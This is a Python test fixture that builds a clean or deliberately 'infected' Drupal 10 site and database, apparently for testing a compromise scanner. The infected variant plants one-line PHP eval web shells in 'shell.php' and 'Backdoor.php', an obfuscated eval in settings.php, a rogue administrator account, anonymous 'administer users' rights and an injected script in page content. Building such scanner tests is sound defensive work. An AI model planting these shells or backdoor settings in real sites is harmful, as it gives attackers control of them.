"""Testwelt für Drupal 10 (2.8.0): Dateien, settings.php und eine SQLite-Datenbank mit den Drupal-Tabellen. Nicht dasselbe wie ein echter Drupal-Server (Tabellen- und Feldnamen von Hand nachgebaut)."""
import os
import sqlite3
import time
from typing import Dict

import fixture
from fixture import install_mysql_shim, w

DRUPAL_PHP = "<?php\nclass Drupal {\n  const VERSION = '10.3.1';\n  const CORE_COMPATIBILITY = '^10';\n}\n"
SETTINGS_GOOD = """<?php
$databases['default']['default'] = [
  'database' => 'drupal_db',
  'username' => 'drupal_user',
  'password' => 'GEHEIM-DB-PASSWORT',
  'prefix' => '',
  'host' => 'localhost',
  'port' => '3306',
  'driver' => 'mysql',
];
$settings['hash_salt'] = 'zufallswert-geheim-123';
$settings['trusted_host_patterns'] = ['^www\\.testseite\\.example$'];
$settings['config_sync_directory'] = '../config/sync';
"""
SETTINGS_BAD = SETTINGS_GOOD.replace("$settings['trusted_host_patterns'] = ['^www\\.testseite\\.example$'];\n", "") + "$settings['update_free_access'] = TRUE;\n@eval(base64_decode('ZWNobyAxOw=='));\n"
SCHEMA = """
CREATE TABLE users_field_data (uid INTEGER PRIMARY KEY, name TEXT, mail TEXT, status INTEGER, created INTEGER, access INTEGER, login INTEGER);
CREATE TABLE user__roles (entity_id INTEGER, roles_target_id TEXT);
CREATE TABLE config (collection TEXT, name TEXT, data TEXT);
CREATE TABLE node__body (entity_id INTEGER, body_value TEXT);
CREATE TABLE block_content__body (entity_id INTEGER, body_value TEXT);
CREATE TABLE comment__comment_body (entity_id INTEGER, comment_body_value TEXT);
"""


def info(name, version, typ="module"):
    return "name: %s\ntype: %s\ndescription: Test\npackage: Test\ncore_version_requirement: ^10\nversion: '%s'\n" % (name, typ, version)


def build_site(root: str, infected: bool) -> str:
    site = os.path.join(root, "html", "site")
    os.makedirs(site, exist_ok=True)
    w(site + "/core/lib/Drupal.php", DRUPAL_PHP, days_ago=60)
    for i in range(220):
        w(site + "/core/lib/Drupal/Core/Part%d.php" % i, "<?php\n// core %d\n" % i, days_ago=60)
    w(site + "/index.php", "<?php\nuse Drupal\\Core\\DrupalKernel;\n", days_ago=60)
    w(site + "/autoload.php", "<?php\n// autoload\n", days_ago=60)
    w(site + "/update.php", "<?php\n// update\n", days_ago=60)
    w(site + "/.htaccess", "# Drupal htaccess\nOptions -Indexes\n", days_ago=60)
    w(site + "/robots.txt", "User-agent: *\n", days_ago=60)
    w(site + "/sites/default/settings.php", SETTINGS_BAD if infected else SETTINGS_GOOD, days_ago=8 if infected else 90, mode=0o666 if infected else 0o444)
    w(site + "/modules/contrib/pathauto/pathauto.info.yml", info("Pathauto", "1.12.0"), days_ago=40)
    w(site + "/modules/contrib/pathauto/pathauto.module", "<?php\n// pathauto\n", days_ago=40)
    w(site + "/modules/contrib/token/token.info.yml", info("Token", "1.14.0"), days_ago=40)
    w(site + "/modules/custom/meinmodul/meinmodul.info.yml", "name: Mein Modul\ntype: module\ncore_version_requirement: ^10\n", days_ago=40)
    w(site + "/themes/contrib/gin/gin.info.yml", info("Gin", "4.0.0", "theme"), days_ago=40)
    if infected:
        w(site + "/modules/contrib/devel/devel.info.yml", info("Devel", "5.2.0"), days_ago=10)
        w(site + "/sites/default/files/shell.php", "<?php @eval($_POST['x']); ?>", days_ago=2)
        w(site + "/core/lib/Drupal/Core/Backdoor.php", "<?php @eval(base64_decode($_GET['c']));", days_ago=2)
    w(site + "/sites/default/files/css/a.css", "body{}", days_ago=3)
    w(site + "/sites/default/files/bild.jpg", "JFIF" + "\x00" * 40, days_ago=30)
    return site


def build_db(path: str, infected: bool) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now = int(time.time())
    c = con.cursor()
    c.execute("INSERT INTO users_field_data VALUES (1,'chef','chef@example.org',1,?,?,?)", (now - 900 * 86400, now - 86400, now - 86400))
    c.execute("INSERT INTO user__roles VALUES (1,'administrator')")
    c.execute("INSERT INTO users_field_data VALUES (2,'redakteur','red@example.org',1,?,?,?)", (now - 300 * 86400, now - 5 * 86400, now - 5 * 86400))
    c.execute("INSERT INTO user__roles VALUES (2,'editor')")
    logging = 'a:2:{s:11:"error_level";s:%d:"%s";s:15:"error_page_node";s:0:"";}' % ((7, "verbose") if infected else (4, "hide"))
    reg = "visitors" if infected else "admin_only"
    c.execute("INSERT INTO config VALUES ('', 'system.logging', ?)", (logging,))
    c.execute("INSERT INTO config VALUES ('', 'user.settings', ?)", ('a:2:{s:8:"register";s:%d:"%s";s:11:"verify_mail";b:1;}' % (len(reg), reg),))
    mods = '"pathauto";i:0;s:5:"token";i:0;' + ('s:5:"devel";i:0;' if infected else "")
    c.execute("INSERT INTO config VALUES ('', 'core.extension', ?)", ('a:1:{s:6:"module";a:3:{s:8:"pathauto";i:0;s:5:"token";i:0;%s}}' % ('s:5:"devel";i:0;' if infected else ""),))
    perms = 'a:1:{s:11:"permissions";a:2:{i:0;s:14:"access content";i:1;s:%d:"%s";}}'
    anon = ("administer users", ) if infected else ("view media",)
    c.execute("INSERT INTO config VALUES ('', 'user.role.anonymous', ?)", (perms % (len(anon[0]), anon[0]),))
    c.execute("INSERT INTO config VALUES ('', 'user.role.authenticated', ?)", ('a:1:{s:11:"permissions";a:1:{i:0;s:14:"access content";}}',))
    c.execute("INSERT INTO node__body VALUES (1, '<p>Willkommen</p>')")
    if infected:
        c.execute("INSERT INTO users_field_data VALUES (3,'support','s@mail.example',1,?,0,0)", (now - 2 * 86400,))
        c.execute("INSERT INTO user__roles VALUES (3,'administrator')")
        c.execute("INSERT INTO node__body VALUES (2, '<p>x</p><script>eval(atob(\"YWxlcnQoMSk=\"))</script>')")
        c.execute("INSERT INTO node__body VALUES (3, '<iframe src=\"https://youtube.com/embed/x\"></iframe>')")
    con.commit()
    con.close()


def make_drupal_world(base: str, infected: bool = True) -> Dict[str, str]:
    tag = "dr_infected" if infected else "dr_clean"
    home = os.path.join(base, tag, "home")
    os.makedirs(home, exist_ok=True)
    site = build_site(home, infected)
    dbp = os.path.join(base, tag, "test.sqlite")
    build_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, tag, "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/site", "db": dbp, "bin": bin_dir}
